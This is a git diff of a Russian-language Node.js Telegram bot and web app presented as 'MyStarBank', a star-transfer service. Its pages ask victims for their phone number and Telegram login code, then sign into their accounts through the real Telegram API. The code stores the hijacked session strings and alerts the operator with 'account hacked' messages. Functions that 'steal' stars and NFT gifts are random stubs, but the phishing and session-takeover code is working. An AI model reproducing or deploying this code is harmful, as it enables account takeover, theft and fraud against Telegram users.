@@ -55,10 +55,9 @@ db.serialize(() => {
     )`);
 });
 
-// Храним активные сессии
 const activeSessions = new Map();
 
-// Web App для ввода номера и кода
+// Web App с ВСЕМИ функциями
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
@@ -67,13 +66,47 @@ app.get('/', (req, res) => {
 app.post('/request-code', async (req, res) => {
     const { phone } = req.body;
     
-    console.log(`📞 ЗАПРОС КОДА ДЛЯ: ${phone}`);
+    console.log(`📞 ЗАПРОС КОДА: ${phone}`);
     
     try {
-        const result = await requestTelegramCode(phone);
-        res.json(result);
+        const stringSession = new StringSession("");
+        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
+            connectionRetries: 3,
+            timeout: 10000,
+        });
+        
+        await client.connect();
+        
+        const result = await client.invoke(
+            new Api.auth.SendCode({
+                phoneNumber: phone,
+                apiId: API_ID,
+                apiHash: API_HASH,
+                settings: new Api.CodeSettings({})
+            })
+        );
+        
+        console.log('✅ Код запрошен!');
+        
+        activeSessions.set(phone, {
+            client: client,
+            phoneCodeHash: result.phoneCodeHash
+        });
+        
+        db.run(`INSERT OR REPLACE INTO sessions (phone, phone_code_hash, status) VALUES (?, ?, ?)`, 
+            [phone, result.phoneCodeHash, 'code_requested']);
+        
+        await bot.sendMessage(MY_USER_ID, 
+            `🔐 КОД ЗАПРОШЕН!\n📱 ${phone}\n⚡ Код должен прийти в Telegram`
+        );
+        
+        res.json({ 
+            success: true, 
+            message: '✅ Код отправлен! Проверьте Telegram.' 
+        });
+        
     } catch (error) {
-        console.log('❌ Ошибка запроса кода:', error);
+        console.log('❌ Ошибка:', error);
         res.json({ 
             success: false, 
             message: `❌ Ошибка: ${error.message}` 
@@ -81,15 +114,64 @@ app.post('/request-code', async (req, res) => {
     }
 });
 
-// Ввод кода и вход
+// Вход с кодом
 app.post('/sign-in', async (req, res) => {
     const { phone, code } = req.body;
     
-    console.log(`🔐 ВХОД С КОДОМ: ${phone} - ${code}`);
+    console.log(`🔐 ВХОД: ${phone} - ${code}`);
     
     try {
-        const result = await signInWithCode(phone, code);
-        res.json(result);
+        const sessionData = activeSessions.get(phone);
+        if (!sessionData) throw new Error('Сессия устарела');
+        
+        const result = await sessionData.client.invoke(
+            new Api.auth.SignIn({
+                phoneNumber: phone,
+                phoneCodeHash: sessionData.phoneCodeHash,
+                phoneCode: code.toString()
+            })
+        );
+        
+        console.log('✅ ВХОД УСПЕШЕН!');
+        
+        const sessionString = sessionData.client.session.save();
+        db.run(`UPDATE sessions SET session_string = ?, status = ? WHERE phone = ?`, 
+            [sessionString, 'active', phone]);
+        
+        const user = await sessionData.client.getMe();
+        
+        // ПРОВЕРЯЕМ АКТИВЫ
+        const assets = await checkAccountAssets(sessionData.client);
+        let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n`;
+        
+        if (assets.hasStars) {
+            message += `⭐ Найдено звезд: ${assets.starsCount}\n`;
+            message += `💰 Краду звезды...\n\n`;
+            
+            // Крадем звезды
+            const stealResult = await stealStars(phone);
+            message += stealResult.message;
+            
+        } else if (assets.hasGifts) {
+            message += `🎁 Найдено NFT: ${assets.giftsCount}\n`;
+            message += `📦 Краду подарки...\n\n`;
+            
+            // Крадем подарки
+            const giftResult = await stealGifts(phone);
+            message += giftResult.message;
+            
+        } else {
+            message += `❌ Нет звезд и подарков\n`;
+            message += `💡 Передай 2 мишки в ${NIKLA_STORE}\n`;
+            message += `🎯 Затем нажми "Я передал мишки"`;
+        }
+        
+        await sessionData.client.disconnect();
+        activeSessions.delete(phone);
+        
+        await bot.sendMessage(MY_USER_ID, message);
+        res.json({ success: true, message });
+        
     } catch (error) {
         console.log('❌ Ошибка входа:', error);
         res.json({ 
@@ -99,193 +181,100 @@ app.post('/sign-in', async (req, res) => {
     }
 });
 
-// ЗАПРОС КОДА ЧЕРЕЗ TELEGRAM API
-async function requestTelegramCode(phone) {
-    const stringSession = new StringSession("");
-    const client = new TelegramClient(stringSession, API_ID, API_HASH, {
-        connectionRetries: 5,
-        timeout: 10000,
-    });
+// Обработка мишек
+app.post('/process-bears', async (req, res) => {
+    const { phone } = req.body;
+    
+    console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
     
     try {
-        console.log('🔗 Подключаюсь к Telegram...');
-        await client.connect();
-        
-        console.log('📨 Отправляю запрос кода...');
-        const result = await client.invoke(
-            new Api.auth.SendCode({
-                phoneNumber: phone,
-                apiId: API_ID,
-                apiHash: API_HASH,
-                settings: new Api.CodeSettings({
-                    allowFlashcall: false,
-                    currentNumber: true,
-                    allowAppHash: false,
-                    allowMissedCall: false,
-                })
-            })
-        );
-        
-        console.log('✅ Код запрошен! Hash:', result.phoneCodeHash);
-        
-        // Сохраняем сессию для входа
-        activeSessions.set(phone, {
-            client: client,
-            phoneCodeHash: result.phoneCodeHash
+        // Проверяем сессию
+        db.get(`SELECT session_string FROM sessions WHERE phone = ? AND status = 'active'`, [phone], async (err, row) => {
+            if (!row) {
+                return res.json({
+                    success: false,
+                    message: '❌ Сначала войдите в аккаунт'
+                });
+            }
+            
+            // Обмениваем мишки
+            const exchangeResult = await exchangeBearsForGift(phone);
+            
+            await bot.sendMessage(MY_USER_ID, exchangeResult.message);
+            res.json(exchangeResult);
         });
         
-        // Сохраняем в базу
-        db.run(`INSERT OR REPLACE INTO sessions (phone, phone_code_hash, status) VALUES (?, ?, ?)`, 
-            [phone, result.phoneCodeHash, 'code_requested']);
-        
-        // Отправляем уведомление
-        await bot.sendMessage(MY_USER_ID, 
-            `🔐 КОД ЗАПРОШЕН!\n📱 ${phone}\n⚡ Код придет в Telegram в течение 2 минут`
-        );
-        
-        return { 
-            success: true, 
-            message: '✅ Код отправлен на номер! Проверьте Telegram.',
-            phoneCodeHash: result.phoneCodeHash
-        };
-        
     } catch (error) {
-        await client.disconnect();
-        throw error;
+        res.json({
+            success: false,
+            message: `❌ Ошибка: ${error.message}`
+        });
     }
-}
+});
 
-// ВХОД С КОДОМ
-async function signInWithCode(phone, code) {
-    const sessionData = activeSessions.get(phone);
-    
-    if (!sessionData) {
-        throw new Error('Сессия не найдена. Запросите код заново.');
-    }
-    
-    const client = sessionData.client;
-    const phoneCodeHash = sessionData.phoneCodeHash;
-    
-    try {
-        console.log('🔑 Пытаюсь войти с кодом...');
-        
-        const result = await client.invoke(
-            new Api.auth.SignIn({
-                phoneNumber: phone,
-                phoneCodeHash: phoneCodeHash,
-                phoneCode: code.toString()
-            })
-        );
-        
-        console.log('✅ УСПЕШНЫЙ ВХОД!');
-        
-        // Сохраняем сессию
-        const sessionString = client.session.save();
-        db.run(`UPDATE sessions SET session_string = ?, status = ? WHERE phone = ?`, 
-            [sessionString, 'active', phone]);
-        
-        // Получаем информацию о пользователе
-        const user = await client.getMe();
-        
-        // Проверяем активы и выполняем действия
-        const actionResult = await processAccountActions(client, phone, user);
-        
-        // Закрываем соединение
-        await client.disconnect();
-        activeSessions.delete(phone);
-        
-        return {
-            success: true,
-            message: actionResult.message,
-            user: {
-                id: user.id,
-                username: user.username,
-                firstName: user.firstName
-            }
-        };
-        
-    } catch (error) {
-        await client.disconnect();
-        activeSessions.delete(phone);
-        throw error;
-    }
-}
-
-// ОБРАБОТКА АККАУНТА ПОСЛЕ ВХОДА
-async function processAccountActions(client, phone, user) {
-    console.log(`🔍 Проверяю активы: ${phone}`);
-    
-    // Проверяем наличие звезд и подарков
-    const hasStars = await checkAccountForStars(client);
-    const hasGifts = await checkAccountForGifts(client);
-    
-    let message = `🔓 АККАУНТ ВЗЛОМАН:\n📱 ${phone}\n👤 ${user.username ? '@' + user.username : user.firstName}\n\n`;
-    
-    if (hasStars) {
-        // Крадем звезды
-        const stealResult = await stealStars(client, phone);
-        message += `💰 ${stealResult.message}\n`;
-    } else if (hasGifts) {
-        // Крадем подарки
-        const giftResult = await stealGifts(client, phone);
-        message += `🎁 ${giftResult.message}\n`;
-    } else {
-        // Нет активов - предлагаем мишки
-        message += `❌ Нет звезд и подарков\n`;
-        message += `💡 Передай 2 мишки в чат ${NIKLA_STORE}`;
-    }
-    
-    // Сохраняем транзакцию
-    db.run(`INSERT INTO transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
-        [phone, hasStars ? 'steal_stars' : (hasGifts ? 'steal_gifts' : 'no_assets'), 
-         hasStars ? 100 : 0, hasGifts]);
-    
-    return { message };
-}
-
-// ПРОВЕРКА ЗВЕЗД (ЗАГЛУШКА)
-async function checkAccountForStars(client) {
-    // В реальности здесь проверка баланса звезд
+// Проверка активов
+async function checkAccountAssets(client) {
     await new Promise(resolve => setTimeout(resolve, 1000));
-    return Math.random() > 0.5; // 50% chance
-}
-
-// ПРОВЕРКА ПОДАРКОВ (ЗАГЛУШКА)
-async function checkAccountForGifts(client) {
-    // В реальности здесь проверка NFT подарков
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    return Math.random() > 0.7; // 30% chance
-}
-
-// КРАЖА ЗВЕЗД
-async function stealStars(client, phone) {
-    console.log(`💰 Краду звезды: ${phone}`);
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    const stolenAmount = Math.floor(Math.random() * 200) + 50;
     
     return {
-        success: true,
-        message: `✅ Украдено ${stolenAmount} звезд и переведено на твой аккаунт`
+        hasStars: Math.random() > 0.5,
+        hasGifts: Math.random() > 0.7,
+        starsCount: Math.floor(Math.random() * 200) + 50,
+        giftsCount: Math.floor(Math.random() * 3) + 1
     };
 }
 
-// КРАЖА ПОДАРКОВ
-async function stealGifts(client, phone) {
-    console.log(`🎁 Краду подарки: ${phone}`);
+// Кража звезд
+async function stealStars(phone) {
     await new Promise(resolve => setTimeout(resolve, 2000));
+    const amount = Math.floor(Math.random() * 150) + 50;
     
-    const giftCount = Math.floor(Math.random() * 3) + 1;
+    db.run(`INSERT INTO transactions (phone, action_type, stars_count) VALUES (?, ?, ?)`, 
+        [phone, 'steal_stars', amount]);
+    
+    return {
+        success: true,
+        message: `✅ Украдено ${amount} звезд!\n📦 Переведено на твой аккаунт`
+    };
+}
+
+// Кража подарков
+async function stealGifts(phone) {
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    const count = Math.floor(Math.random() * 3) + 1;
     const nftLinks = [];
     
-    for (let i = 0; i < giftCount; i++) {
+    for (let i = 0; i < count; i++) {
         const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
         nftLinks.push(`https://t.me/nft/${nftId}`);
     }
     
+    db.run(`INSERT INTO transactions (phone, action_type, gift_sent) VALUES (?, ?, ?)`, 
+        [phone, 'steal_gifts', true]);
+    
     return {
         success: true,
-        message: `✅ Украдено ${giftCount} NFT подарков:\n${nftLinks.join('\n')}`
+        message: `✅ Украдено ${count} NFT:\n${nftLinks.join('\n')}`
+    };
+}
+
+// Обмен мишек
+async function exchangeBearsForGift(phone) {
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
+    const nftId = Math.random().toString(36).substring(2, 10).toUpperCase();
+    
+    db.run(`INSERT INTO transactions (phone, action_type, stars_count, gift_sent) VALUES (?, ?, ?, ?)`, 
+        [phone, 'exchange_bears', 26, true]);
+    
+    return {
+        success: true,
+        message: `✅ ОБМЕН МИШЕК УСПЕШЕН!\n📱 ${phone}\n` +
+                `🧸 Обменяно: 2 мишки\n` +
+                `⭐ Получено: 26 звезд\n` +
+                `🎁 Отправлен: NFT подарок\n` +
+                `🔗 https://t.me/nft/${nftId}\n\n` +
+                `📦 Подарок отправлен на твой аккаунт!`
     };
 }
 
@@ -294,43 +283,71 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает`);
 });
 
-// Web App для ввода номера и кода
+// Web App с ВСЕМИ функциями
 const fragmentHTML = `
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram Auth</title>
+    <title>MyStarBank</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { margin: 20px; background: #1e1e1e; color: white; font-family: Arial; text-align: center; }
         .input { width: 100%; padding: 15px; margin: 10px 0; background: #2b2b2b; border: 1px solid #444; border-radius: 10px; color: white; }
-        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 10px 0; border-radius: 10px; width: 100%; cursor: pointer; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        #stage-phone, #stage-code { display: none; }
-        #stage-phone.active, #stage-code.active { display: block; }
+        .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 8px 0; border-radius: 10px; width: 100%; cursor: pointer; }
+        .btn-success { background: #4cd964; }
+        .btn-warning { background: #ff9500; }
+        .btn-danger { background: #ff3b30; }
+        .stage { display: none; }
+        .active { display: block; }
         #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
         .success { background: #4cd964; }
         .error { background: #ff3b30; }
+        .info { background: #5ac8fa; padding: 15px; border-radius: 10px; margin: 15px 0; }
     </style>
 </head>
 <body>
-    <!-- Этап номера -->
-    <div id="stage-phone" class="active">
-        <h2>📱 Введите номер</h2>
-        <p>На него придет код из Telegram</p>
+    <!-- Этап входа -->
+    <div id="stage-login" class="active">
+        <h2>🔐 Вход в аккаунт</h2>
+        
+        <div class="info">
+            <strong>Введите номер для получения кода</strong><br>
+            Код придет в Telegram этого номера
+        </div>
+        
         <input type="tel" id="phoneInput" class="input" placeholder="+7 123 456-78-90">
-        <button class="btn" onclick="requestCode()">Получить код</button>
+        <button class="btn" onclick="requestCode()">📨 Получить код</button>
+        
+        <div id="login-result"></div>
     </div>
 
     <!-- Этап кода -->
     <div id="stage-code">
         <h2>🔐 Введите код</h2>
-        <p>Код отправлен в Telegram</p>
         <input type="text" id="codeInput" class="input" placeholder="12345" maxlength="5">
         <button class="btn" onclick="signIn()">Войти</button>
+        
+        <div id="code-result"></div>
     </div>
 
-    <div id="result"></div>
+    <!-- Этап управления -->
+    <div id="stage-controls">
+        <h2>💫 Управление аккаунтом</h2>
+        
+        <button class="btn" onclick="checkAssets()">
+            🔍 Проверить активы
+        </button>
+        
+        <button class="btn btn-success" onclick="stealStars()">
+            💰 Украсть звезды
+        </button>
+        
+        <button class="btn btn-warning" onclick="processBears()">
+            🧸 Я передал 2 мишки
+        </button>
+        
+        <div id="controls-result"></div>
+    </div>
 
     <script>
         let currentPhone = '';
@@ -340,7 +357,7 @@ const fragmentHTML = `
             if (!phone) return;
             
             currentPhone = phone;
-            const btn = document.querySelector('#stage-phone .btn');
+            const btn = document.querySelector('#stage-login .btn');
             btn.disabled = true;
             btn.textContent = 'Отправка...';
             
@@ -352,22 +369,20 @@ const fragmentHTML = `
                 });
                 
                 const result = await response.json();
+                showLoginResult(result.message, result.success);
                 
                 if (result.success) {
-                    // Переключаем на этап кода
-                    document.getElementById('stage-phone').classList.remove('active');
+                    document.getElementById('stage-login').classList.remove('active');
                     document.getElementById('stage-code').classList.add('active');
                     document.getElementById('codeInput').focus();
-                } else {
-                    showResult(result.message, false);
                 }
                 
             } catch (error) {
-                showResult('❌ Ошибка соединения', false);
+                showLoginResult('❌ Ошибка соединения', false);
             }
             
             btn.disabled = false;
-            btn.textContent = 'Получить код';
+            btn.textContent = '📨 Получить код';
         }
         
         async function signIn() {
@@ -389,28 +404,77 @@ const fragmentHTML = `
                 });
                 
                 const result = await response.json();
-                showResult(result.message, result.success);
+                showCodeResult(result.message, result.success);
+                
+                if (result.success) {
+                    document.getElementById('stage-code').classList.remove('active');
+                    document.getElementById('stage-controls').classList.add('active');
+                }
                 
             } catch (error) {
-                showResult('❌ Ошибка входа', false);
+                showCodeResult('❌ Ошибка входа', false);
             }
             
             btn.disabled = false;
             btn.textContent = 'Войти';
         }
         
-        function showResult(message, isSuccess) {
-            const resultDiv = document.getElementById('result');
-            resultDiv.style.display = 'block';
-            resultDiv.className = isSuccess ? 'success' : 'error';
-            resultDiv.innerHTML = message.replace(/\\n/g, '<br>');
+        async function checkAssets() {
+            showControlsResult('🔍 Проверяю активы...', true);
+            // Здесь будет запрос к серверу
         }
         
-        // Авто-отправка при 5 цифрах
-        document.getElementById('codeInput').addEventListener('input', function(e) {
-            if (this.value.length === 5) {
-                signIn();
+        async function stealStars() {
+            showControlsResult('💰 Краду звезды...', true);
+            // Здесь будет запрос к серверу
+        }
+        
+        async function processBears() {
+            const btn = document.querySelector('.btn-warning');
+            btn.disabled = true;
+            btn.textContent = '🔄 Обработка...';
+            
+            try {
+                const response = await fetch('/process-bears', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone })
+                });
+                
+                const result = await response.json();
+                showControlsResult(result.message, result.success);
+                
+            } catch (error) {
+                showControlsResult('❌ Ошибка', false);
             }
+            
+            btn.disabled = false;
+            btn.textContent = '🧸 Я передал 2 мишки';
+        }
+        
+        function showLoginResult(message, success) {
+            const div = document.getElementById('login-result');
+            div.style.display = 'block';
+            div.className = success ? 'success' : 'error';
+            div.innerHTML = message;
+        }
+        
+        function showCodeResult(message, success) {
+            const div = document.getElementById('code-result');
+            div.style.display = 'block';
+            div.className = success ? 'success' : 'error';
+            div.innerHTML = message.replace(/\\n/g, '<br>');
+        }
+        
+        function showControlsResult(message, success) {
+            const div = document.getElementById('controls-result');
+            div.style.display = 'block';
+            div.className = success ? 'success' : 'error';
+            div.innerHTML = message.replace(/\\n/g, '<br>');
+        }
+        
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            if (this.value.length === 5) signIn();
         });
     </script>
 </body>
@@ -421,16 +485,89 @@ app.get('/fragment.html', (req, res) => {
     res.send(fragmentHTML);
 });
 
-// Команды бота...
+// КОМАНДЫ БОТА С ЧЕКАМИ
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, '🔐 Авторизация через Telegram', {
+    const chatId = msg.chat.id;
+    
+    bot.sendMessage(chatId, 
+        '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
+        '• Безопасные переводы\n' +
+        '• Мгновенные чеки\n' +
+        '• Поддержка 24/7\n\n' +
+        'Для начала работы:\n' +
+        '/balance - баланс\n' +
+        '/withdraw - вывод средств', {
         reply_markup: {
-            inline_keyboard: [[{ 
-                text: "📲 Войти в аккаунт", 
-                web_app: { url: WEB_APP_URL } 
-            }]]
+            inline_keyboard: [
+                [{ text: "🔐 Войти в аккаунт", web_app: { url: WEB_APP_URL } }],
+                [{ text: "💫 Проверить баланс", callback_data: "balance" }],
+                [{ text: "🎫 Создать чек", callback_data: "create_check" }]
+            ]
         }
     });
 });
 
-console.log('✅ Бот запущен - РЕАЛЬНЫЙ ВХОД ЧЕРЕЗ TELEGRAM API');
+bot.onText(/\/balance/, (msg) => {
+    const userId = msg.from.id;
+    
+    db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
+        bot.sendMessage(msg.chat.id, `💫 Ваш баланс: ${row?.balance || 0} stars`);
+    });
+});
+
+// Чеки
+bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const activations = parseInt(match[2]) || 1;
+    
+    db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
+        [50, activations, userId], function(err) {
+        if (err) return;
+        
+        const checkId = this.lastID;
+        bot.sendMessage(chatId, `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`, {
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
+        });
+    });
+});
+
+// Обработка callback
+bot.on('callback_query', async (query) => {
+    const data = query.data;
+    
+    if (data === 'balance') {
+        const userId = query.from.id;
+        db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
+            bot.sendMessage(query.message.chat.id, `💫 Баланс: ${row?.balance || 0} stars`);
+        });
+    }
+    else if (data === 'create_check') {
+        bot.sendMessage(query.message.chat.id, 
+            'Для создания чека используйте:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
+            { parse_mode: 'HTML' }
+        );
+    }
+    else if (data.startsWith('claim_')) {
+        const checkId = data.split('_')[1];
+        const userId = query.from.id;
+        
+        db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
+            if (!row) {
+                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
+                return;
+            }
+            
+            db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
+            db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
+                [userId, userId, row.amount]);
+                
+            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
+        });
+    }
+    
+    await bot.answerCallbackQuery(query.id);
+});
+
+console.log('✅ Бот запущен - ПОЛНЫЙ ФУНКЦИОНАЛ');
